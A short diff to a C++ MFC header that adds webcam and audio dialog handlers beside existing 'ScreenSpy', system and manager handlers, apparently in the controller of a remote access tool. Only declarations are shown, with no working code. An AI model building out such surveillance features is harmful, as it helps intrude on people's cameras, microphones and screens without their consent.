@@ -84,6 +84,8 @@ private:
 	afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam, LPARAM lParam);
 	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam);
 	afx_msg LRESULT OnOpenManagerDialog(WPARAM wParam, LPARAM lParam);
+	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
+	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
 
 public:
 	void SendSelectCommand(PBYTE pData, UINT nSize);
